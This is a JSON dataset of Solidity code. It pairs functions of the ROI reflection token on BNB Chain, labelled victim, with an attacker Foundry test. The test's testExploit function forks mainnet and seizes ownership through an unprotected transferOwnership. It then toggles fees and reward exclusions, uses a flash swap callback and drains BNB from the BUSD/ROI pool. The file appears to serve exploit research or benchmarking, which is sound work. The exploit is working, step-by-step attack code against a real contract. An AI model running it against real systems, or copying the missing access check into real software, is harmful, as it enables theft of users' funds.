[
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "GetBuyBackTimeInterval",
    "original_code": "    function GetBuyBackTimeInterval() public view returns(uint256) {\n        return _buyBackTimeInterval.div(60);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "GetSwapMinutes",
    "original_code": "    function GetSwapMinutes() public view returns(uint256) {\n        return _intervalMinutesForSwap.div(60);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "SetBuyBackDivisor",
    "original_code": "    function SetBuyBackDivisor(uint256 newDivisor) external onlyOwner {\n        _buyBackDivisor = newDivisor;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "SetBuyBackMaxTimeForHistories",
    "original_code": "    function SetBuyBackMaxTimeForHistories(uint256 newMinutes) external onlyOwner {\n        _buyBackMaxTimeForHistories = newMinutes * 1 minutes;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "SetBuyBackRangeRate",
    "original_code": "    function SetBuyBackRangeRate(uint256 newPercent) external onlyOwner {\n        require(newPercent <= 100, \"The value must not be larger than 100.\");\n        _buyBackRangeRate = newPercent;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "SetBuyBackTimeInterval",
    "original_code": "    function SetBuyBackTimeInterval(uint256 newMinutes) external onlyOwner {\n        _buyBackTimeInterval = newMinutes * 1 minutes;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "SetSwapMinutes",
    "original_code": "    function SetSwapMinutes(uint256 newMinutes) external onlyOwner {\n        _intervalMinutesForSwap = newMinutes * 1 minutes;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "Sweep",
    "original_code": "    function Sweep() external onlyOwner {\n        uint256 balance = address(this).balance;\n        payable(owner()).transfer(balance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_addressFees",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_buyBackDivisor",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_buyBackMaxTimeForHistories",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_buyBackRangeRate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_buyBackTimeInterval",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_buyLiquidityFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_buyTaxFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_intervalMinutesForSwap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_isAutoBuyBack",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_isEnabledBuyBackAndBurn",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_liquidityFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_maxTxAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_sellHistories",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_sellLiquidityFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_sellTaxFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_startTimeForSwap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "_taxFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "afterPreSale",
    "original_code": "    function afterPreSale() external onlyOwner {\n        setSwapAndLiquifyEnabled(true);\n        _taxFee = 2;\n        _liquidityFee = 10;\n        _maxTxAmount = 10000000 * 10**6 * 10**9;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "buyBackEnabled",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "buyBackSellLimit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "buyBackSellLimitAmount",
    "original_code": "    function buyBackSellLimitAmount() public view returns (uint256) {\n        return buyBackSellLimit;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "changeRouterVersion",
    "original_code": "    function changeRouterVersion(address _router) public onlyOwner returns(address _pair) {\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_router);\n        \n        _pair = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());\n        if(_pair == address(0)){\n            // Pair doesn't exist\n            _pair = IUniswapV2Factory(_uniswapV2Router.factory())\n            .createPair(address(this), _uniswapV2Router.WETH());\n        }\n        uniswapV2Pair = _pair;\n\n        // Set the router of the contract variables\n        uniswapV2Router = _uniswapV2Router;\n    }\n    \n     // To recieve ETH from uniswapV2Router when swapping\n    receive() external payable {}\n\n       \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "deadAddress",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "decreaseAllowance",
    "original_code": "    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "deliver",
    "original_code": "    function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "excludeFromFee",
    "original_code": "    function excludeFromFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = true;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "excludeFromReward",
    "original_code": "    function excludeFromReward(address account) public onlyOwner() {\n\n        require(!_isExcluded[account], \"Account is already excluded\");\n        if(_rOwned[account] > 0) {\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        }\n        _isExcluded[account] = true;\n        _excluded.push(account);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "getTime",
    "original_code": "    function getTime() public view returns (uint256) {\n        return block.timestamp;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "getUnlockTime",
    "original_code": "    function getUnlockTime() public view returns (uint256) {\n        return _lockTime;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "includeInFee",
    "original_code": "    function includeInFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = false;\n    }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "includeInReward",
    "original_code": "    function includeInReward(address account) external onlyOwner() {\n        require(_isExcluded[account], \"Account is not excluded\");\n        for (uint256 i = 0; i < _excluded.length; i++) {\n            if (_excluded[i] == account) {\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n            }\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "increaseAllowance",
    "original_code": "    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "isExcludedFromFee",
    "original_code": "    function isExcludedFromFee(address account) public view returns(bool) {\n        return _isExcludedFromFee[account];\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "isExcludedFromReward",
    "original_code": "    function isExcludedFromReward(address account) public view returns (bool) {\n        return _isExcluded[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "lock",
    "original_code": "    function lock(uint256 time) public virtual onlyOwner {\n        _previousOwner = _owner;\n        _owner = address(0);\n        _lockTime = block.timestamp + time;\n        emit OwnershipTransferred(_owner, address(0));\n    }\n    \n    function unlock() public virtual {\n        require(_previousOwner == msg.sender, \"You don't have permission to unlock\");\n        require(block.timestamp > _lockTime , \"Contract is locked until 7 days\");\n        emit OwnershipTransferred(_owner, _previousOwner);\n        _owner = _previousOwner;\n    }\n}\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "marketingAddress",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "marketingDivisor",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "minimumTokensBeforeSwapAmount",
    "original_code": "    function minimumTokensBeforeSwapAmount() public view returns (uint256) {\n        return minimumTokensBeforeSwap;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }   \n    \n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "prepareForPreSale",
    "original_code": "    function prepareForPreSale() external onlyOwner {\n        setSwapAndLiquifyEnabled(false);\n        _taxFee = 0;\n        _liquidityFee = 0;\n        _maxTxAmount = 1000000000 * 10**6 * 10**9;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "reflectionFromToken",
    "original_code": "    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {\n        require(tAmount <= _tTotal, \"Amount must be less than supply\");\n        if (!deductTransferFee) {\n            (uint256 rAmount,,,,,) = _getValues(tAmount);\n            return rAmount;\n        } else {\n            (,uint256 rTransferAmount,,,,) = _getValues(tAmount);\n            return rTransferAmount;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "renounceOwnership",
    "original_code": "    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setAddressFee",
    "original_code": "    function setAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external onlyOwner {\n        _addressFees[_address].enable = _enable;\n        _addressFees[_address]._taxFee = _addressTaxFee;\n        _addressFees[_address]._liquidityFee = _addressLiquidityFee;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setAutoBuyBackEnabled",
    "original_code": "    function setAutoBuyBackEnabled(bool _enabled) public onlyOwner {\n        _isAutoBuyBack = _enabled;\n        emit AutoBuyBackEnabledUpdated(_enabled);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setBuyAddressFee",
    "original_code": "    function setBuyAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external onlyOwner {\n        _addressFees[_address].enable = _enable;\n        _addressFees[_address]._buyTaxFee = _addressTaxFee;\n        _addressFees[_address]._buyLiquidityFee = _addressLiquidityFee;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setBuyBackEnabled",
    "original_code": "    function setBuyBackEnabled(bool _enabled) public onlyOwner {\n        buyBackEnabled = _enabled;\n        emit BuyBackEnabledUpdated(_enabled);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setBuyBackSellLimit",
    "original_code": "    function setBuyBackSellLimit(uint256 buyBackSellSetLimit) external onlyOwner {\n        buyBackSellLimit = buyBackSellSetLimit;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setBuyFee",
    "original_code": "    function setBuyFee(uint256 buyTaxFee, uint256 buyLiquidityFee) external onlyOwner {\n        _buyTaxFee = buyTaxFee;\n        _buyLiquidityFee = buyLiquidityFee;\n    }\n   \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setLiquidityFeePercent",
    "original_code": "    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner {\n        _liquidityFee = liquidityFee;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setMarketingAddress",
    "original_code": "    function setMarketingAddress(address _marketingAddress) external onlyOwner {\n        marketingAddress = payable(_marketingAddress);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setMarketingDivisor",
    "original_code": "    function setMarketingDivisor(uint256 divisor) external onlyOwner {\n        marketingDivisor = divisor;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setMaxTxAmount",
    "original_code": "    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner {\n        _maxTxAmount = maxTxAmount;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setNumTokensSellToAddToBuyBack",
    "original_code": "    function setNumTokensSellToAddToBuyBack(uint256 _minimumTokensBeforeSwap) external onlyOwner {\n        minimumTokensBeforeSwap = _minimumTokensBeforeSwap;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setSellAddressFee",
    "original_code": "    function setSellAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external onlyOwner {\n        _addressFees[_address].enable = _enable;\n        _addressFees[_address]._sellTaxFee = _addressTaxFee;\n        _addressFees[_address]._sellLiquidityFee = _addressLiquidityFee;\n    }\n    \n}\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setSellFee",
    "original_code": "    function setSellFee(uint256 sellTaxFee, uint256 sellLiquidityFee) external onlyOwner {\n        _sellTaxFee = sellTaxFee;\n        _sellLiquidityFee = sellLiquidityFee;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setSwapAndLiquifyEnabled",
    "original_code": "    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\n        swapAndLiquifyEnabled = _enabled;\n        emit SwapAndLiquifyEnabledUpdated(_enabled);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "setTaxFeePercent",
    "original_code": "    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {\n        _taxFee = taxFee;\n    }\n        \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "swapAndLiquifyEnabled",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "tokenFromReflection",
    "original_code": "    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n        uint256 currentRate =  _getRate();\n        return rAmount.div(currentRate);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "totalFees",
    "original_code": "    function totalFees() public view returns (uint256) {\n        return _tFeeTotal;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "transferForeignToken",
    "original_code": "    function transferForeignToken(address _token, address _to) public onlyOwner returns(bool _sent){\n        require(_token != address(this), \"Can't let you take all native token\");\n        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));\n        _sent = IERC20(_token).transfer(_to, _contractBalance);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "transferOwnership",
    "original_code": "    function transferOwnership(address newOwner) public virtual {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "uniswapV2Pair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "uniswapV2Router",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IROIToken",
    "source_type": "victim_contract",
    "function_name": "unlock",
    "original_code": "    function unlock() public virtual {\n        require(_previousOwner == msg.sender, \"You don't have permission to unlock\");\n        require(block.timestamp > _lockTime , \"Contract is locked until 7 days\");\n        emit OwnershipTransferred(_owner, _previousOwner);\n        _owner = _previousOwner;\n    }\n}\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        require(keccak256(data) == keccak256(\"3030\"), \"Invalid PancakeSwap Callback\");\n        ROI.transfer(address(busdroiPair), ROI.balanceOf(address(this))); // Notice: 99% taxfee SHOULD be charged from the attacker\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21_143_795);\n        cheat.deal(address(this), 5 ether);\n        cheat.label(address(ROI), \"ROI\");\n        cheat.label(address(busd), \"BUSD\");\n        cheat.label(address(wbnb), \"WBNB\");\n        cheat.label(address(pancakeRouter), \"PancakeRouter\");\n        cheat.label(address(busdroiPair), \"BUSD/ROI Pair\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker BNB Balance:\", address(this).balance, 18);\n\n        console.log(\"----------------------------------------------------\");\n        console.log(\"Attacker swap some BNB to ROI for attack fund...\");\n        console.log(\"Before [WBNB, BUSD, ROI] swap:\");\n        emit log_named_decimal_uint(\"\\tBNB balance of attacker:\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9);\n\n        address[] memory path = new address[](3);\n        path[0] = address(wbnb);\n        path[1] = address(busd);\n        path[2] = address(ROI); // [WBNB, BUSD, ROI]\n        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111_291_832_999_209, path, address(this), block.timestamp); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee\n\n        console.log(\"After [WBNB, BUSD, ROI] swap:\");\n        emit log_named_decimal_uint(\"\\tBNB balance of attacker:\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9);\n        console.log(\"----------------------------------------------------\");\n\n        ROI.transferOwnership(address(this)); // Broken Access Control\n        ROI.setTaxFeePercent(0);\n        ROI.setBuyFee(0, 0);\n        ROI.setSellFee(0, 0);\n        ROI.setLiquidityFeePercent(0);\n\n        // These's addresses are all of the ROI Token holders, but the [BUSD/ROI Pair] is not listed.\n        // Ref: https://bscscan.com/token/0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c#balances\n        ROI.excludeFromReward(address(0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722));\n        ROI.excludeFromReward(address(0x216FC1D66677c9A778C60E6825189508b9619908));\n        ROI.excludeFromReward(address(0x61708418F929f264Edd312aDC7089eB9d69cEd9C));\n        ROI.excludeFromReward(address(0xC81DC8F793415B80d7Ee604e936B79D85BD771B6));\n        ROI.excludeFromReward(address(0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C));\n        ROI.excludeFromReward(address(0xA982444d884e00C7dFBBCB90e7a705E567853d0E));\n        ROI.excludeFromReward(address(0x899045B0B52d55Be0210A1046a01B99C78E44540));\n        ROI.excludeFromReward(address(0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F));\n        ROI.excludeFromReward(address(0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8));\n        ROI.excludeFromReward(address(0x6f84160a01f3D4005eB50582d14F17B72575A80A));\n        ROI.excludeFromReward(address(0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96));\n        ROI.excludeFromReward(address(0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b));\n        ROI.excludeFromReward(address(ROI));\n        ROI.excludeFromReward(address(this));\n\n        console.log(\"Attacker sends all ROI to [BUSD/ROI Pair] but withholding 100,000 ROI\");\n        uint256 ROI_bal = ROI.balanceOf(address(this));\n        ROI.transfer(address(busdroiPair), ROI_bal - 100_000e9); // taxfee is zero\n        console.log(\"----------------------------------------------------\");\n\n        console.log(\"Before flashloans from [BUSD/ROI Pair]\");\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9); // Expect 100,000\n        emit log_named_decimal_uint(\"\\tBUSD balance of attacker:\", busd.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"\\tROI balance of BUSD/ROI Pair:\", ROI.balanceOf(address(busdroiPair)), 9);\n        emit log_named_decimal_uint(\"\\tBUSD balance of BUSD/ROI Pair:\", busd.balanceOf(address(busdroiPair)), 18);\n\n        ROI.setTaxFeePercent(99);\n        // Attacker flashloans 4,343,012 ROI from [BUSD/ROI Pair], and attacker will immediately payback\n        busdroiPair.swap(4_343_012_692_003_417, 0, address(this), \"3030\"); // Notice: 99% taxfee will be charged from the [BUSD/ROI Pair]\n\n        console.log(\"After flashloans from [BUSD/ROI Pair]\");\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9); // Expect 0, Because #L122\n        emit log_named_decimal_uint(\"\\tBUSD balance of attacker:\", busd.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"\\tROI balance of BUSD/ROI Pair:\", ROI.balanceOf(address(busdroiPair)), 9); // Expect before+100,000\n        emit log_named_decimal_uint(\"\\tBUSD balance of BUSD/ROI Pair:\", busd.balanceOf(address(busdroiPair)), 18); // Expect same value\n\n        ROI.setTaxFeePercent(0);\n        ROI.includeInReward(address(this)); // This will set _tOwned[address(this)] = 0\n\n        busdroiPair.sync(); // Sync reserve before swap\n        path[0] = address(ROI);\n        path[2] = address(wbnb); // [ROI, BUSD, WBNB]\n        ROI.approve(address(pancakeRouter), type(uint256).max);\n        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            3_986_806_268_542_825, 0, path, address(this), block.timestamp\n        ); // Oops, zero ROI balance but the _rOwned[address(this)] has been bypassed\n        console.log(\"----------------------------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker BNB Balance:\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  }
]